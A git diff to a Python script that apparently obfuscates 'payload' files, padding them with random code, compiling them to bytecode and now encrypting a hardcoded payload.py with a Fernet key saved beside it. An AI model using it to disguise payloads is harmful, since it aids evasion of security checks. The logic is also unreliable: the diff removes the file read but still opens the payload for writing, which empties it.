@@ -5,7 +5,7 @@ import os
 import random
 import requests
 from bs4 import BeautifulSoup
-
+from cryptography.fernet import Fernet
 
 def random_code_generation():
     url = "http://www.4geeks.de/cgi-bin/webgen.py"
@@ -25,6 +25,17 @@ _byte_ = (_output_) + "c"  # bytecode format
 start = 1
 end = random.randint(9, 20)
 
+
+def write_key():
+    """
+    Generates a key and save it into a file
+    """
+    key = Fernet.generate_key()
+    with open("key.key", "wb") as key_file:
+        key_file.write(key)
+    return key
+
+
 parser = optparse.OptionParser()
 parser.add_option("--file", "-f", help="python file  ", action="store", dest="file")
 parser.add_option("--output", "-o", help="output of python file ", dest="out", action="store")
@@ -33,11 +44,20 @@ option, arg = parser.parse_args()
 
 payload = option.file
 
-didi = open(payload, 'r')
-hades = didi.read()
-didi.close()
 
 hd = open(payload, 'w')
+
+
+def encrypt(filename, key):
+    f = Fernet(key)
+    with open(filename, "rb") as file:
+        # read all file data
+        file_data = file.read()
+        encrypted_data = f.encrypt(file_data)
+        with open("criptato", "wb") as file:
+            file.write(encrypted_data)
+
+
 while start != end:
     hd.write(random.choice(randomArray))
     start += 1
@@ -45,6 +65,12 @@ hd.close()
 
 output = option.out
 bytecode = option.out + "c"
+
+encrypt("payload.py", write_key())
+
+
+
+
 
 try:
     py_compile.compile(payload, cfile=bytecode, dfile=None, doraise=False, )  # compilation
